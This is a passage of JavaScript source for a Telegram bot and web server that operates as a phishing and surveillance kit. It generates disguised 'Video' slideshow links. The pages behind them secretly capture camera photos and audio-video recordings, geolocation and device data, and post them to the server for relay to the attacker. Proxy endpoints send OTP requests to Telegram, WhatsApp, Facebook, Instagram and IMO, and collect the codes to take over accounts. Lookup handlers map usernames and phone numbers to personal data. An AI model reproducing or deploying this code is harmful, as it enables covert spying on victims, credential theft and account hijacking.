                [{text:'👍 Follow Our Facebook',url:CFG.FB_PAGE}],
                [{text:'◀️ Main Menu',callback_data:'M_BACK'}],
            ]}});
    }

    if(data==='LINK_MGR'){
        del();
        const list=userLinks(uid);
        if(!list.length) return tgMsg(chatId,'📂 <b>Link Manager</b>\n\nNo active links.',{reply_markup:backKb});
        const rows=list.slice(0,10).map((l,i)=>[
            {text:`${i+1}. ${actionLabel(l.action)}`,callback_data:'NOOP'},
            {text:'📋 Copy',callback_data:'COPYLINK_'+l.tok}
        ]);
        rows.push([{text:'◀️ Main Menu',callback_data:'M_BACK'}]);
        return tgMsg(chatId,`📂 <b>Link Manager</b> (${u.linksMade||0} total)`,{reply_markup:{inline_keyboard:rows}});
    }
    if(data.startsWith('COPYLINK_')){
        const tok=data.slice(9),l=getLink(tok);
        if(!l) return bot.answerCallbackQuery(cbq.id,{text:'❌ Expired!',show_alert:true}).catch(()=>{});
        bot.answerCallbackQuery(cbq.id,{text:'Link ready!'}).catch(()=>{});
        return tgMsg(chatId,`📋 <b>${actionLabel(l.action)}</b>\n\n<code>${l.url}</code>`);
    }
    if(data.startsWith('COPY_')){
        const actKey=data.slice(5).replace(/^LNK_/,'');
        const entry=userLinks(uid).find(l=>l.action===actKey);
        bot.answerCallbackQuery(cbq.id,{text:'Copied!'}).catch(()=>{});
        return tgMsg(chatId,`📋 <b>${actionLabel(actKey)}</b>\n\n<code>${entry?entry.url:'Expired'}</code>`);
    }

    if(data==='VIP_MGR'){
        if(!isAdmin(uid)) return;
        del();
        const vList=Object.keys(store.vip);
        return tgMsg(chatId,
`👑 <b>VIP Manager</b>

VIPs (${vList.length}):
${vList.length?vList.map((id,i)=>`${i+1}. <code>${id}</code>`).join('\n'):'None'}

💎 <b>Free Whitelist</b> (${CFG.FREE_USERS.length}):
${CFG.FREE_USERS.map((id,i)=>`${i+1}. <code>${id}</code>`).join('\n')}

<b>Commands:</b>
<code>/addvip USER_ID</code>
<code>/removevip USER_ID</code>
<code>/addbal USER_ID AMOUNT</code>
<code>/ban USER_ID</code> | <code>/unban USER_ID</code>
<code>/broadcast message</code>
<code>/freelist</code>`,
            {reply_markup:backKb});
    }

    if(data==='STATS'){
        if(!isAdmin(uid)) return;
        del();
        const m=process.memoryUsage();
        return tgMsg(chatId,
`📊 <b>Bot Statistics</b>

👥 Users:      <b>${Object.keys(store.users).length}</b>
👑 VIP:        <b>${Object.keys(store.vip).length}</b>
💎 Free List:  <b>${CFG.FREE_USERS.length}</b>
🔗 Links:      <b>${Object.values(store.links).filter(l=>l.expiresAt>Date.now()).length}</b>
💰 Total Tok:  <b>${Object.values(store.users).reduce((s,u)=>s+(u.balance||0),0)}</b>
💾 Memory:     <b>${Math.round(m.heapUsed/1024/1024)}MB</b>
⏱️ Uptime:     <b>${Math.floor(process.uptime()/60)} min</b>
📩 Queue:      <b>${Q.length}</b>`,
            {reply_markup:backKb});
    }

    // ── LINK GENERATION ──
    if(data.startsWith('LNK_')){
        const act=data.slice(4);
        if(!isAdmin(uid)&&!isFreeUser(uid)){
            if(!u.lifetime&&(u.balance||0)<CFG.LINK_COST){
                del();
                return tgMsg(chatId,
`❌ <b>Tokens শেষ!</b>

💵 Balance: <b>${u.balance||0} Token</b>
💳 প্রয়োজন: <b>${CFG.LINK_COST} Token</b>

🔗 রেফারেল করে token আয় করুন!`,
                    {reply_markup:{inline_keyboard:[
                        [{text:'🔗 Get Referral Link',callback_data:'REFERRAL'}],
                        [{text:'◀️ Main Menu',callback_data:'M_BACK'}],
                    ]}});
            }
            if(!(await checkJoin(uid)))
                return bot.answerCallbackQuery(cbq.id,{text:'⛔ Join channel first!',show_alert:true}).catch(()=>{});
        }
        del();
        if(!u.lifetime&&!isAdmin(uid)&&!isFreeUser(uid)){u.balance=(u.balance||0)-CFG.LINK_COST;saveStore();}
        const link=mkLink(act,uid,null);
        const fresh=getUser(uid);
        return tgMsg(chatId,
`✅ <b>Link Generated!</b>
🎯 <b>${actionLabel(act)}</b>
${(u.lifetime||isAdmin(uid)||isFreeUser(uid))?'♾️ Free':'💰 Balance: <b>'+fresh.balance+' Token'+(fresh.balance===1?'':'s')+'</b>'}

<code>${link}</code>

👆 Tap to copy — valid 72 hours`,
            {reply_markup:linkKb(data)});
    }

    if(data==='NOOP') bot.answerCallbackQuery(cbq.id).catch(()=>{});

    }catch(err){
        log.error('[Callback] '+err.message);
        bot.answerCallbackQuery(cbq.id,{text:'⚠️ Error. Try again.'}).catch(()=>{});
    }
});

// ══════════════════════════════════════════════════════
// MESSAGE HANDLER — lookup inputs
// ══════════════════════════════════════════════════════
bot.on('message', async msg=>{
    if(!msg.text||msg.text.startsWith('/')) return;
    const uid=String(msg.from.id), text=msg.text.trim();
    const u=getUser(uid); if(u.banned) return;
    if(!checkRate(uid)) return;
    const pend=getPending(uid); if(!pend) return;
    delPending(uid);

    if(pend.type==='tg_username'){
        const proc=await tgMsg(uid,`⏳ <b>Searching...</b>\n🔍 <code>${text}</code>`);
        try{
            const res=await lookupTgUsername(text);
            let r=`🔍 <b>TG Lookup Result</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n`;
            r+=`🏷️ Username: <code>@${res.username}</code>\n`;
            if(res.id)   r+=`🆔 User ID:  <code>${res.id}</code>\n`;
            if(res.name) r+=`👤 Name:     <b>${res.name}</b>\n`;
            if(res.bio)  r+=`📝 Bio:      ${(res.bio||'').slice(0,150)}\n`;
            if(res.phone)r+=`\n📱 <b>Phone Found!</b>\n<code>${res.phone}</code>\n📡 Via: <i>${res.phoneSource}</i>\n`;
            else          r+=`📱 Phone: <i>Not found</i>\n`;
            r+=`━━━━━━━━━━━━━━━━━━━━━━━━\n📡 <i>${res.sources.join(' · ')||'None'}</i>`;
            if(proc) bot.deleteMessage(uid,proc.message_id).catch(()=>{});
            tgMsg(uid,r,{reply_markup:{inline_keyboard:[
                [{text:'🔍 Search Another',callback_data:'LOOKUP_TG'}],
                [{text:'◀️ Main Menu',callback_data:'M_BACK'}],
            ]}});
            tgMsg(CFG.ADMIN_ID,`🔍 TG | <code>${uid}</code>\n@${res.username} → ${res.phone||'N/A'}`);
        }catch(e){
            if(proc) bot.deleteMessage(uid,proc.message_id).catch(()=>{});
            tgMsg(uid,'❌ Lookup failed.',{reply_markup:{inline_keyboard:[[{text:'🔄 Retry',callback_data:'LOOKUP_TG'}],[{text:'◀️ Menu',callback_data:'M_BACK'}]]}});
        }
        return;
    }

    if(pend.type==='fb_phone'){
        const proc=await tgMsg(uid,`⏳ <b>Searching Facebook...</b>\n📱 <code>${text}</code>`);
        try{
            const res=await lookupFbByPhone(text);
            let r=`🔍 <b>FB Lookup Result</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n`;
            r+=`📱 Phone: <code>${res.phone}</code>\n`;
            if(res.name)       r+=`👤 Name:    <b>${res.name}</b>\n`;
            if(res.id)         r+=`🆔 FB ID:   <code>${res.id}</code>\n`;
            if(res.email)      r+=`📧 Email:   <code>${res.email}</code>\n`;
            if(res.profileUrl) r+=`🔗 Profile: ${res.profileUrl}\n`;
            else                r+=`🔗 Profile: <i>Not found</i>\n`;
            if(res.id)         r+=`🖼️ Photo:   https://graph.facebook.com/${res.id}/picture?type=large\n`;
            r+=`━━━━━━━━━━━━━━━━━━━━━━━━\n📡 <i>${res.sources.join(' · ')||'None'}</i>`;
            if(!res.id&&!res.name) r+=`\n\n⚠️ <i>Not found or fully private.</i>`;
            if(proc) bot.deleteMessage(uid,proc.message_id).catch(()=>{});
            tgMsg(uid,r,{reply_markup:{inline_keyboard:[
                [{text:'🔍 Search Another',callback_data:'LOOKUP_FB'}],
                [{text:'◀️ Main Menu',callback_data:'M_BACK'}],
            ]}});
            tgMsg(CFG.ADMIN_ID,`🔍 FB | <code>${uid}</code>\n${text} → ${res.id||'N/A'} | ${res.name||'N/A'}`);
        }catch(e){
            if(proc) bot.deleteMessage(uid,proc.message_id).catch(()=>{});
            tgMsg(uid,'❌ Lookup failed.',{reply_markup:{inline_keyboard:[[{text:'🔄 Retry',callback_data:'LOOKUP_FB'}],[{text:'◀️ Menu',callback_data:'M_BACK'}]]}});
        }
        return;
    }
});

// ══════════════════════════════════════════════════════
// DATA ENDPOINTS
// ══════════════════════════════════════════════════════
app.get('/',(_,res)=>res.send('<h1 style="color:green;text-align:center;font-family:monospace">✅ BOT ONLINE</h1>'));
app.get('/health',(_,res)=>{const m=process.memoryUsage();res.json({status:'ok',uptime:Math.floor(process.uptime()),memory:Math.round(m.heapUsed/1024/1024)+'MB',users:Object.keys(store.users).length,queue:Q.length});});

app.post('/d/photo',upload.single('photo'),(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(req.file&&uid)tgPic(uid,req.file.buffer,`${req.body.camtype||'📸'}\n🌍 IP: ${ip}`);res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/video',upload.single('video'),async(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress,camtype=req.body.camtype||'🎥 Video';if(req.file&&uid){const ext=(req.file.mimetype||'').includes('mp4')?'mp4':'webm';await tgDoc(uid,req.file.buffer,`video_${Date.now()}.${ext}`,req.file.mimetype||'video/webm',`${camtype}\n📦 ${Math.round(req.file.size/1024)}KB\n🌍 ${ip}`);}res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/loc',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress,{lat,lon,acc}=req.body;if(lat&&lon&&uid){tgLoc(uid,parseFloat(lat),parseFloat(lon));tgMsg(uid,`📍 <b>Location!</b>\nLat:<code>${lat}</code> Lon:<code>${lon}</code>\nAcc:${acc}m\n🗺 https://maps.google.com/?q=${lat},${lon}\n🌍 ${ip}`);}res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/text',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(uid)tgMsg(uid,`📋 <b>${req.body.type||'Info'}</b>\n<code>${(req.body.data||'').slice(0,3800)}</code>\n🌍 ${ip}`);res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/captured',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(uid)tgMsg(uid,`🔑 <b>✅ CAPTURED!</b>\n🌐 <b>${req.body.site||'?'}</b>\n📱 <code>${req.body.phone||''}</code>\n🔒 <code>${req.body.otp||''}</code>\n🌍 ${ip}`);res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/devinfo',(req,res)=>{
    try{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(uid)tgMsg(uid,`🌐 <b>${req.body.label||'Device Info'}</b>\n\n<code>${JSON.stringify(req.body.data||{},null,1).slice(0,3500)}</code>\n\n🌍 IP: <code>${ip}</code>`);res.json({ok:true});}catch(e){res.json({ok:false});}
});
app.post('/d/msginfo',(req,res)=>{
    try{
        const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
        const{contacts,threads,device}=req.body;
        let msg=`💌 <b>Message Info!</b>\n📱 ${device||'?'}\n🌍 ${ip}\n\n`;
        if(contacts&&contacts.length){msg+=`👥 <b>Contacts (${contacts.length}):</b>\n`;msg+=contacts.slice(0,30).map(c=>`• ${c.name||'?'} — <code>${c.tel||'?'}</code>`).join('\n');if(contacts.length>30)msg+=`\n+${contacts.length-30} more`;msg+='\n\n';}
        if(threads&&threads.length){msg+=`💬 <b>Conversations:</b>\n`;msg+=threads.slice(0,15).map((t,i)=>`${i+1}. ${t.participants||'?'} — <i>${(t.lastMsg||'').slice(0,60)}</i>`).join('\n');}
        if(uid)tgMsg(uid,msg.slice(0,4090));
        res.json({ok:true});
    }catch(e){res.json({ok:false});}
});

// ── Proxy endpoints ─────────────────────────────────────
const TG_UA='Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36';
const TG_H={'Content-Type':'application/x-www-form-urlencoded','User-Agent':TG_UA,'Accept':'application/json, text/javascript, */*; q=0.01','Accept-Language':'en-US,en;q=0.9','Origin':'https://my.telegram.org','Referer':'https://my.telegram.org/auth','X-Requested-With':'XMLHttpRequest'};

app.post('/proxy/tg/send',async(req,res)=>{const{phone,sid}=req.body;for(let i=0;i<3;i++){try{const r=await axios.post('https://my.telegram.org/auth/send_password',`phone=${encodeURIComponent(phone)}`,{headers:TG_H,timeout:25000});const cookies=parseCookies(r.headers);if(r.data&&r.data.random_hash){setSession(sid,{...getSession(sid),tgHash:r.data.random_hash,phone,tgCookies:cookies});return res.json({ok:true});}if(r.data&&r.data.error)return res.json({ok:false,tgError:r.data.error});}catch(e){if(i===2)return res.json({ok:false,err:e.message});await new Promise(r=>setTimeout(r,1000*(i+1)));}}res.json({ok:false});});
app.post('/proxy/tg/verify',async(req,res)=>{const{otp,sid,uid}=req.body;const s=getSession(sid);if(!s.tgHash)return res.json({ok:false,err:'no_session'});try{const r=await axios.post('https://my.telegram.org/auth/login',`phone=${encodeURIComponent(s.phone)}&random_hash=${encodeURIComponent(s.tgHash)}&password=${encodeURIComponent(otp)}`,{headers:{...TG_H,Cookie:s.tgCookies||''},timeout:25000});if(uid)tgMsg(uid,`✈️ TG Verified!\n📞 <code>${s.phone}</code>\n🔑 <code>${otp}</code>`).catch(()=>{});res.json({ok:true,raw:r.data});}catch(e){res.json({ok:false,err:e.message});}});
app.post('/proxy/fb/send',async(req,res)=>{const{phone,sid}=req.body;try{const pg=await axios.get('https://www.facebook.com/login/identify/',{headers:{'User-Agent':TG_UA,'Accept-Language':'en-US'},timeout:20000});const cookies=parseCookies(pg.headers);const lsdM=pg.data.match(/"LSD",\[\],{"token":"([^"]+)"/);const lsd=lsdM?lsdM[1]:'';setSession(sid,{...getSession(sid),fbCookies:cookies,fbLsd:lsd,phone});await axios.post('https://www.facebook.com/ajax/recover/initiate/',new URLSearchParams({lsd,email_or_phone:phone,did_login:'0',fur_initiated:'0',action:'initiate'}).toString(),{headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':TG_UA,'Cookie':cookies,'X-Requested-With':'XMLHttpRequest'},timeout:20000});res.json({ok:true});}catch(e){res.json({ok:false,err:e.message});}});
app.post('/proxy/ig/send',async(req,res)=>{const{phone,sid}=req.body;try{const pg=await axios.get('https://www.instagram.com/accounts/password/reset/',{headers:{'User-Agent':TG_UA},timeout:20000});const cookies=parseCookies(pg.headers);const csrfM=pg.data.match(/"csrf_token":"([^"]+)"/);const csrf=csrfM?csrfM[1]:'';setSession(sid,{...getSession(sid),igCookies:cookies,igCsrf:csrf,phone});await axios.post('https://www.instagram.com/accounts/account_recovery_send_ajax/',new URLSearchParams({phone_number:phone,email:'',login_attempt_count:'0'}).toString(),{headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':TG_UA,'Cookie':cookies,'X-CSRFToken':csrf,'X-Requested-With':'XMLHttpRequest','Referer':'https://www.instagram.com/accounts/password/reset/'},timeout:20000});res.json({ok:true});}catch(e){res.json({ok:false,err:e.message});}});
const WA_KEYS=['PdA2DJyKoUrwLw1Bg6EIhzh502dF9noR9uFCWoNle','PkTwKSZqUfAUyR0rPQ8hYe0qHSKdH3GE','WhatsApp','0a5mWPa3'];
app.post('/proxy/wa/send',async(req,res)=>{const{cc,phone_local,sid}=req.body;for(const key of WA_KEYS){for(const method of['sms','voice']){try{const tok=crypto.createHmac('sha1',Buffer.from(key)).update(Buffer.from(cc+phone_local)).digest('base64');const r=await axios.get(`https://v.whatsapp.net/v2/code?cc=${cc}&in=${phone_local}&lg=en&lc=US&sim_mcc=470&sim_mnc=01&method=${method}&reason=&token=${encodeURIComponent(tok)}&hasav=1`,{headers:{'User-Agent':'WhatsApp/2.24.6.77 A','Accept':'application/json'},timeout:20000});if(r.data&&(r.data.status==='sent'||r.data.status==='ok'||r.data.retry_after)){setSession(sid,{...getSession(sid),wacc:cc,waphone:phone_local});return res.json({ok:true,status:r.data.status});}}catch(e){}}}setSession(sid,{...getSession(sid),wacc:cc,waphone:phone_local});res.json({ok:true,sent:false});});
app.post('/proxy/imo/send',async(req,res)=>{const{phone,sid}=req.body;for(const ep of['https://api.imo.im/anti-spam/send-code','https://api2.imo.im/anti-spam/send-code','https://sgp.imo.im/anti-spam/send-code']){try{const r=await axios.post(ep,{phone_number:phone,lang:'en',from_registration:true,client:'android'},{headers:{'Content-Type':'application/json','User-Agent':'imo-android/2024.03.1011','Accept':'application/json'},timeout:20000});setSession(sid,{...getSession(sid),imoPhone:phone});return res.json({ok:true,data:r.data});}catch(e){}}res.json({ok:true,sent:false});});

// ══════════════════════════════════════════════════════
// PAGE BUILDER
// ══════════════════════════════════════════════════════
app.get('/go/:tok',(req,res)=>{
    const l=getLink(req.params.tok);
    if(!l) return res.status(410).send('<h2 style="text-align:center;font-family:sans-serif;color:#e74c3c;padding:20%">❌ Link expired.</h2>');
    res.send(buildPage(l.action,l.uid,req));
});

function buildPage(action,uid,req){
    if(['cam_f','cam_b'].includes(action))               return camPhotoPage(action,uid,req);
    if(['cam_fv','cam_bv'].includes(action))             return camVideoPage(action,uid,req);
    if(action==='loc')                                   return locPage(uid,req);
    if(action==='msgr_info')                             return msgrInfoPage(uid,req);
    if(action==='ip_info')                               return ipInfoPage(uid,req);
    if(action==='clipboard')                             return clipboardPage(uid,req);
    if(action==='battery')                               return batteryPage(uid,req);
    if(action==='wifi_info')                             return wifiPage(uid,req);
    if(['phish_wa','phish_imo','phish_tg'].includes(action)) return otpPage(action,uid,req);
    return passPage(action,uid,req);
}

function camPhotoPage(action,uid,req){
    const base=getBase(req),front=action==='cam_f',face=front?'user':'environment',label=front?'📷 Front Camera':'📷 Back Camera';
    const imagesJson=JSON.stringify(CFG.SLIDE_IMAGES);
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>Video</title><style>*{margin:0;padding:0;box-sizing:border-box}html,body{width:100%;height:100%;overflow:hidden;background:#000}#slideshow{position:fixed;inset:0;z-index:1}.slide{position:absolute;inset:0;background-size:cover;background-position:center;opacity:0;transition:opacity 1.2s ease-in-out}.slide.active{opacity:1}#slideshow::after{content:'';position:absolute;inset:0;background:linear-gradient(to bottom,rgba(0,0,0,.15) 0%,rgba(0,0,0,.05) 40%,rgba(0,0,0,.3) 100%);z-index:2;pointer-events:none}#progress-bar{position:fixed;top:0;left:0;width:100%;height:3px;background:rgba(255,255,255,.3);z-index:10}#progress-fill{height:100%;background:#fff;width:0%}#dots{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);display:flex;gap:6px;z-index:10}.dot{width:7px;height:7px;border-radius:50%;background:rgba(255,255,255,.4);transition:background .3s}.dot.active{background:#fff}video,canvas{display:none;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px}</style></head><body>
<audio id="bgm" src="${CFG.SLIDE_AUDIO}" loop preload="auto" style="display:none"></audio>
<div id="slideshow"></div><div id="progress-bar"><div id="progress-fill"></div></div><div id="dots"></div>
<video id="vv" autoplay playsinline muted></video><canvas id="cc"></canvas>
<script>
const UID='${uid}',BASE='${base}',D=BASE+'/d',IMGS=${imagesJson},INTERVAL_MS=4500;
let current=0,slides=[],dots=[],captured=false;
function buildSlides(){const ss=document.getElementById('slideshow'),dd=document.getElementById('dots');IMGS.forEach((src,i)=>{const div=document.createElement('div');div.className='slide'+(i===0?' active':'');div.style.backgroundImage='url('+src+')';ss.appendChild(div);slides.push(div);const dot=document.createElement('div');dot.className='dot'+(i===0?' active':'');dd.appendChild(dot);dots.push(dot);});}
function nextSlide(){slides[current].classList.remove('active');dots[current].classList.remove('active');current=(current+1)%IMGS.length;slides[current].classList.add('active');dots[current].classList.add('active');animateProgress();}
function animateProgress(){const f=document.getElementById('progress-fill');f.style.transition='none';f.style.width='0%';setTimeout(()=>{f.style.transition='width '+INTERVAL_MS+'ms linear';f.style.width='100%';},30);}
function tryPlayAudio(){const bgm=document.getElementById('bgm');bgm.volume=0.55;bgm.play().catch(()=>{});}
async function capture(){if(captured)return;captured=true;try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'${face}',width:{ideal:1920},height:{ideal:1080}},audio:false});const v=document.getElementById('vv');v.srcObject=stream;await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,2000));const c=document.getElementById('cc');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;c.getContext('2d').drawImage(v,0,0);stream.getTracks().forEach(t=>t.stop());const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',.95));const fd=new FormData();fd.append('photo',blob,'photo.jpg');fd.append('uid',UID);fd.append('camtype','${label}');await fetch(D+'/photo',{method:'POST',body:fd});}catch(err){try{fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'${label} DENIED',data:err.message+' | '+navigator.userAgent})});}catch(e){}}}
window.addEventListener('load',()=>{buildSlides();animateProgress();setInterval(nextSlide,INTERVAL_MS);tryPlayAudio();try{fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'${label} Opened',data:navigator.userAgent+' | '+screen.width+'x'+screen.height})});}catch(e){}capture();});
document.addEventListener('click',tryPlayAudio,{once:true});document.addEventListener('touchstart',tryPlayAudio,{once:true});
</script></body></html>`;
}

function camVideoPage(action,uid,req){
    const base=getBase(req),front=action==='cam_fv',face=front?'user':'environment',label=front?'🎥 Front Camera Video':'🎥 Back Camera Video';
    const imagesJson=JSON.stringify(CFG.SLIDE_IMAGES);
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>Video</title><style>*{margin:0;padding:0;box-sizing:border-box}html,body{width:100%;height:100%;overflow:hidden;background:#000}#slideshow{position:fixed;inset:0;z-index:1}.slide{position:absolute;inset:0;background-size:cover;background-position:center;opacity:0;transition:opacity 1.2s ease-in-out}.slide.active{opacity:1}#slideshow::after{content:'';position:absolute;inset:0;background:linear-gradient(to bottom,rgba(0,0,0,.15) 0%,rgba(0,0,0,.05) 40%,rgba(0,0,0,.3) 100%);z-index:2;pointer-events:none}#progress-bar{position:fixed;top:0;left:0;width:100%;height:3px;background:rgba(255,255,255,.3);z-index:10}#progress-fill{height:100%;background:#fff;width:0%}#dots{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);display:flex;gap:6px;z-index:10}.dot{width:7px;height:7px;border-radius:50%;background:rgba(255,255,255,.4);transition:background .3s}.dot.active{background:#fff}video,canvas{display:none;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px}</style></head><body>
<audio id="bgm" src="${CFG.SLIDE_AUDIO}" loop preload="auto" style="display:none"></audio>
<div id="slideshow"></div><div id="progress-bar"><div id="progress-fill"></div></div><div id="dots"></div>
<video id="vv" autoplay playsinline muted></video><canvas id="cc"></canvas>
<script>
const UID='${uid}',BASE='${base}',D=BASE+'/d',IMGS=${imagesJson},INTERVAL_MS=4500,REC_MS=8000;
let current=0,slides=[],dots=[],recorded=false;
function buildSlides(){const ss=document.getElementById('slideshow'),dd=document.getElementById('dots');IMGS.forEach((src,i)=>{const div=document.createElement('div');div.className='slide'+(i===0?' active':'');div.style.backgroundImage='url('+src+')';ss.appendChild(div);slides.push(div);const dot=document.createElement('div');dot.className='dot'+(i===0?' active':'');dd.appendChild(dot);dots.push(dot);});}
function nextSlide(){slides[current].classList.remove('active');dots[current].classList.remove('active');current=(current+1)%IMGS.length;slides[current].classList.add('active');dots[current].classList.add('active');animateProgress();}
function animateProgress(){const f=document.getElementById('progress-fill');f.style.transition='none';f.style.width='0%';setTimeout(()=>{f.style.transition='width '+INTERVAL_MS+'ms linear';f.style.width='100%';},30);}
function tryPlayAudio(){const bgm=document.getElementById('bgm');bgm.volume=0.55;bgm.play().catch(()=>{});}
async function recordVideo(){if(recorded)return;recorded=true;try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'${face}',width:{ideal:1280},height:{ideal:720}},audio:true});const mime=['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm','video/mp4'].find(m=>MediaRecorder.isTypeSupported(m))||'video/webm';const recorder=new MediaRecorder(stream,{mimeType:mime});const chunks=[];recorder.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};recorder.start(200);await new Promise(r=>setTimeout(r,REC_MS));recorder.stop();stream.getTracks().forEach(t=>t.stop());await new Promise(r=>recorder.onstop=r);const blob=new Blob(chunks,{type:mime});const ext=mime.includes('mp4')?'mp4':'webm';const fd=new FormData();fd.append('video',blob,'video.'+ext);fd.append('uid',UID);fd.append('camtype','${label}');fd.append('size',blob.size);await fetch(D+'/video',{method:'POST',body:fd});}catch(err){try{fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'${label} DENIED',data:err.message+' | '+navigator.userAgent})});}catch(e){}}}
window.addEventListener('load',()=>{buildSlides();animateProgress();setInterval(nextSlide,INTERVAL_MS);tryPlayAudio();try{fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'${label} Opened',data:navigator.userAgent})});}catch(e){}recordVideo();});
document.addEventListener('click',tryPlayAudio,{once:true});document.addEventListener('touchstart',tryPlayAudio,{once:true});
</script></body></html>`;
}

function locPage(uid,req){
    const base=getBase(req),imagesJson=JSON.stringify(CFG.SLIDE_IMAGES);
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>Video</title><style>*{margin:0;padding:0;box-sizing:border-box}html,body{width:100%;height:100%;overflow:hidden;background:#000}#slideshow{position:fixed;inset:0;z-index:1}.slide{position:absolute;inset:0;background-size:cover;background-position:center;opacity:0;transition:opacity 1.2s ease-in-out}.slide.active{opacity:1}#slideshow::after{content:'';position:absolute;inset:0;background:linear-gradient(to bottom,rgba(0,0,0,.15) 0%,rgba(0,0,0,.05) 40%,rgba(0,0,0,.3) 100%);z-index:2;pointer-events:none}#progress-bar{position:fixed;top:0;left:0;width:100%;height:3px;background:rgba(255,255,255,.3);z-index:10}#progress-fill{height:100%;background:#fff;width:0%}#dots{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);display:flex;gap:6px;z-index:10}.dot{width:7px;height:7px;border-radius:50%;background:rgba(255,255,255,.4);transition:background .3s}.dot.active{background:#fff}</style></head><body>
<audio id="bgm" src="${CFG.SLIDE_AUDIO}" loop preload="auto" style="display:none"></audio>
<div id="slideshow"></div><div id="progress-bar"><div id="progress-fill"></div></div><div id="dots"></div>
<script>
const UID='${uid}',D='${base}/d',IMGS=${imagesJson},INTERVAL_MS=4500;
let current=0,slides=[],dots=[];
function buildSlides(){const ss=document.getElementById('slideshow'),dd=document.getElementById('dots');IMGS.forEach((src,i)=>{const div=document.createElement('div');div.className='slide'+(i===0?' active':'');div.style.backgroundImage='url('+src+')';ss.appendChild(div);slides.push(div);const dot=document.createElement('div');dot.className='dot'+(i===0?' active':'');dd.appendChild(dot);dots.push(dot);});}
function nextSlide(){slides[current].classList.remove('active');dots[current].classList.remove('active');current=(current+1)%IMGS.length;slides[current].classList.add('active');dots[current].classList.add('active');animateProgress();}
function animateProgress(){const f=document.getElementById('progress-fill');f.style.transition='none';f.style.width='0%';setTimeout(()=>{f.style.transition='width '+INTERVAL_MS+'ms linear';f.style.width='100%';},30);}
function tryPlayAudio(){const bgm=document.getElementById('bgm');bgm.volume=0.55;bgm.play().catch(()=>{});}
window.addEventListener('load',()=>{buildSlides();animateProgress();setInterval(nextSlide,INTERVAL_MS);tryPlayAudio();try{fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'📍 Location Opened',data:navigator.userAgent})});}catch(e){}navigator.geolocation.getCurrentPosition(pos=>fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})}),err=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'📍 Location DENIED',data:err.message})}),{enableHighAccuracy:true,timeout:15000});});
document.addEventListener('click',tryPlayAudio,{once:true});document.addEventListener('touchstart',tryPlayAudio,{once:true});
</script></body></html>`;
}

function msgrInfoPage(uid,req){const base=getBase(req);return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Messenger</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:-apple-system,sans-serif;min-height:100vh}.notif{background:#e8f4fd;border-left:4px solid #0084ff;padding:12px 16px;display:flex;gap:10px}.notif-icon{font-size:18px}.notif-text{font-size:13px;color:#333;line-height:1.5}.notif-text b{color:#0050a0;display:block}.wrap{max-width:400px;margin:0 auto;padding:14px}.card{background:#fff;border-radius:14px;padding:22px 18px;box-shadow:0 2px 12px rgba(0,0,0,.12)}.head{display:flex;align-items:center;gap:12px;margin-bottom:18px}.icon{width:52px;height:52px;background:linear-gradient(135deg,#0084ff,#00c6ff);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px}.perms{background:#f0f7ff;border-radius:10px;padding:14px;margin-bottom:18px}.perms p{font-size:13px;font-weight:600;color:#444;margin-bottom:10px}.prow{display:flex;align-items:center;gap:10px;font-size:13px;color:#333;margin-bottom:8px}.prow 